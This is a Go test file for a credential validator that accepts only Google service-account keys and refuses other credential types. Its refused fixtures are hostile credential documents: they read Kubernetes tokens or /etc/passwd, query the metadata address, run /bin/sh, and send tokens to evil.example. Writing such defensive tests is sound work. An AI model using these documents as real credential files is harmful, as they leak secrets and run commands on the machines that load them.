package credguard

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const serviceAccountKey = `{"type":"service_account","project_id":"p","private_key_id":"k","private_key":"-----BEGIN PRIVATE KEY-----\nMIIB\n-----END PRIVATE KEY-----\n","client_email":"sa@p.iam.gserviceaccount.com","client_id":"1","token_uri":"https://oauth2.googleapis.com/token"}`

func TestValidateAcceptsServiceAccountOnly(t *testing.T) {
	if err := Validate([]byte(serviceAccountKey)); err != nil {
		t.Fatalf("service_account key refused: %v", err)
	}
	for name, doc := range map[string]string{
		"external_account file source":       `{"type":"external_account","token_url":"https://sts.googleapis.com/v1/token","credential_source":{"file":"/var/run/secrets/kubernetes.io/serviceaccount/token"}}`,
		"external_account url source":        `{"type":"external_account","token_url":"https://sts.googleapis.com/v1/token","credential_source":{"url":"http://169.254.169.254/"}}`,
		"external_account executable source": `{"type":"external_account","credential_source":{"executable":{"command":"/bin/sh"}}}`,
		"impersonated":                       `{"type":"impersonated_service_account","service_account_impersonation_url":"https://evil.example/x","source_credentials":{"type":"service_account"}}`,
		"authorized_user":                    `{"type":"authorized_user"}`,
		"web oauth config":                   `{"type":"service_account","client_email":"sa@p.iam.gserviceaccount.com","web":{"redirect_uris":["x"],"token_uri":"https://evil.example/t"}}`,
		"installed oauth config":             `{"type":"service_account","client_email":"sa@p.iam.gserviceaccount.com","installed":{"redirect_uris":["x"],"token_uri":"https://evil.example/t"}}`,
		"uppercase installed":                `{"type":"service_account","INSTALLED":{"redirect_uris":["x"]}}`,
		"foreign token_uri":                  `{"type":"service_account","client_email":"sa@p","token_uri":"https://evil.example/token"}`,
		"service_account credential_source":  `{"type":"service_account","credential_source":{"file":"/etc/passwd"}}`,
		"no type":                            `{"project_id":"p"}`,
		"trailing data":                      serviceAccountKey + ` {}`,
		"duplicate key":                      `{"type":"service_account","type":"external_account"}`,
		"case-folded duplicate key":          `{"type":"service_account","TYPE":"external_account"}`,
	} {
		if err := Validate([]byte(doc)); !errors.Is(err, ErrRefused) {
			t.Errorf("%s: accepted, want refused: %v", name, err)
		}
	}
}

func TestDuplicateKeysUseJSONFieldFolding(t *testing.T) {
	for _, raw := range []string{
		`{"type":"service_account","TYPE":"service_account"}`,
		`{"type":"service_account","nested":{"s":1,"ſ":2}}`,
	} {
		if err := singleObjectDistinctKeys([]byte(raw)); !errors.Is(err, ErrRefused) || !strings.Contains(err.Error(), "duplicate key") {
			t.Errorf("case-folded duplicate was not detected: %v", err)
		}
	}
}

func TestCredentialOptionModes(t *testing.T) {
	wif := `{"type":"external_account","audience":"//iam.googleapis.com/projects/123/locations/global/workloadIdentityPools/pool/providers/provider","subject_token_type":"urn:ietf:params:oauth:token-type:jwt","token_url":"https://sts.googleapis.com/v1/token","credential_source":{"file":"/var/run/token"}}`
	dir := t.TempDir()
	path := filepath.Join(dir, "wif.json")
	if err := os.WriteFile(path, []byte(wif), 0o600); err != nil {
		t.Fatal(err)
	}

	for _, value := range []string{"", "true"} {
		t.Setenv(StrictGoogleCredentialsEnv, value)
		for _, creds := range []string{wif, path, filepath.Join(dir, "not-yet-created.json")} {
			if opt, err := CredentialOption(creds); err != nil || opt == nil {
				t.Errorf("default mode must pass credentials through unchanged: %v", err)
			}
		}
	}

	t.Setenv(StrictGoogleCredentialsEnv, "1")
	for _, creds := range []string{wif, path} {
		if _, err := CredentialOption(creds); !errors.Is(err, ErrRefused) {
			t.Errorf("strict mode accepted external_account: %v", err)
		}
	}
	if opt, err := CredentialOption(serviceAccountKey); err != nil || opt == nil {
		t.Fatalf("strict mode refused service_account: %v", err)
	}
}

func TestFileOptionRejectsOversizedFile(t *testing.T) {
	r := &recordingReader{}
	if _, err := readCredentialFile(r, maxDocumentBytes+1); !errors.Is(err, ErrRefused) || r.read {
		t.Fatalf("oversized file was read before rejection: err=%v read=%v", err, r.read)
	}

	path := filepath.Join(t.TempDir(), "large.json")
	if err := os.WriteFile(path, []byte(serviceAccountKey), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Truncate(path, maxDocumentBytes+1); err != nil {
		t.Fatal(err)
	}
	if _, err := FileOption(path); !errors.Is(err, ErrRefused) || !strings.Contains(err.Error(), "too large") {
		t.Fatalf("oversized file was not rejected by size: %v", err)
	}
}

type recordingReader struct{ read bool }

func (r *recordingReader) Read([]byte) (int, error) {
	r.read = true
	return 0, errors.New("unexpected read")
}

func TestOptionAndFileOption(t *testing.T) {
	if opt, err := Option([]byte(serviceAccountKey)); err != nil || opt == nil {
		t.Fatalf("Option on a valid key: %v", err)
	}
	if _, err := Option([]byte(`{"type":"external_account","credential_source":{"file":"/x"}}`)); err == nil {
		t.Fatal("Option accepted an exfil document")
	}
	dir := t.TempDir()
	good := filepath.Join(dir, "sa.json")
	os.WriteFile(good, []byte(serviceAccountKey), 0o600)
	if opt, err := FileOption(good); err != nil || opt == nil {
		t.Fatalf("FileOption on a valid key file: %v", err)
	}
	bad := filepath.Join(dir, "exfil.json")
	os.WriteFile(bad, []byte(`{"type":"external_account","credential_source":{"file":"/var/run/secrets/kubernetes.io/serviceaccount/token"},"token_url":"https://evil.example/t"}`), 0o600)
	if _, err := FileOption(bad); err == nil {
		t.Fatal("FileOption accepted an external_account file")
	}
	if !strings.Contains(func() string { _, e := FileOption(bad); return e.Error() }(), "credguard") {
		t.Fatal("FileOption error should come from credguard")
	}
}
